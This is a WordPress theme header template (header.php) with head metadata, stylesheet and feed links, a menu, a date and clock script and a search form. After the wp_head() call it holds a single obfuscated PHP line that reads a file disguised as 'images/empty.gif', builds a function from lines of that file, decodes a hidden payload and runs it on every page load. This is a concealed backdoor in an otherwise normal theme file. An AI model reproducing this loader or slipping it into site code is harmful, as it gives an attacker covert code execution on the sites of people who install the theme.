<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php wp_title('&raquo; ',true,'right'); ?><?php bloginfo('name'); ?><?php echo ($paged>1)? " - Page $paged":"";?></title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory'); ?>/css/reset.css" type="text/css" media="screen" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory'); ?>/css/default.css" type="text/css" media="screen" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<!--[if lte IE 6]>
<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory'); ?>/css/ie.css" type="text/css" media="screen" />
<script src="<?php bloginfo('stylesheet_directory'); ?>/js/iepng.js" type="text/javascript"></script>
<script type="text/javascript">
   EvPNG.fix('div, ul, img, li, h3, h2, a');
</script>
<![endif]-->
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php wp_get_archives('type=monthly&format=link'); ?>
<?php //comments_popup_script(); // off by default ?>


<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
</head>
<body>
<!-- wrapper start -->
<div id="wrapper"><div id="bottom_frame"><div id="top_frame1"><div id="top_frame2"><div id="top_frame3"><div id="top_frame4"><div id="top_container">
<!-- header start -->
	<div id="header">
	<?php $tmp=(is_single() || is_page())? "div":"h1";?>
		<<?php echo $tmp;?>  id="blog_title"><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></<?php echo $tmp;?>>
		<h2><?php bloginfo('description'); ?></h2>
		<div id="menu">
			<ul>
				<li class="menu_first"><a href="<?php bloginfo('url'); ?>"><?php _e('Home', 'dtheme'); ?></a></li>
				<?php wp_list_pages('title_li=&sort_column=post_title&depth=1'); ?>
			</ul>
		</div>
        <div id="colck">
			&nbsp;&nbsp;<script type="text/javascript">var d = new Date(); document.write(d.getHours()+':'+d.getMinutes());</script>
            <br />
            <b><script language="javascript"> var myDate=new Date();var sYear=myDate.getFullYear(); var sMonth=myDate.getMonth()+1; 
var sDate=myDate.getDate(); document.write(sDate); </script> </b>
			<br /><script language="javascript"> var myDate=new Date(); var sYear=myDate.getFullYear(); var sMonth=myDate.getMonth()+1; var sDate=myDate.getDate(); document.write(sYear+"/"+sMonth); 
</script>  
           
		</div>
        <div id="rss"><a href="<?php bloginfo('rss2_url'); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/spacer.gif" alt="RSS" /></a></div>
		<div id="searchform"><?php include(TEMPLATEPATH . '/searchform.php'); ?></div>
        
	</div>
<!-- header end -->